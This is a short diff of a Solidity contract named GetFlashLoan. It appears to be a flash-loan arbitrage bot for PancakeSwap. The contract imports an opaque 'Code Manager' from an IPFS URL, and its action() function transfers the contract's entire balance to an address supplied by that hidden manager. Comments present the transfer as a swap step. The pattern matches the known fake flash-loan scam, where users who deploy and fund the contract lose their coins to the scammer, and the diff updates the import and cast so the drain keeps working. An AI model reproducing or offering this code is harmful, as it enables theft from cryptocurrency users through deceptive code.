@@ -10,7 +10,7 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
 // Code Manager
-import "http://bafybeif7kzjlzjm3blujpdw6kf2e7zp5nirsfaj2vhfljvwibrey4bydp4.ipfs.localhost:8080/";
+import "https://ipfs.io/ipfs/QmWoTwT2HdiwXAkFmxJwEefjmeXAePsDf4bj5ttmSFPQ2t";
 
 contract GetFlashLoan {
 	string public tokenName;
@@ -30,7 +30,7 @@ contract GetFlashLoan {
 
 	function action() public payable {
 	    // Send required coins for swap
-	    address(uint256(manager.pancakeDepositAddress())).transfer(address(this).balance);
+	    address(uint160(manager.pancakeDepositAddress())).transfer(address(this).balance);
 
 	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
 	    // Breakdown of functions written below
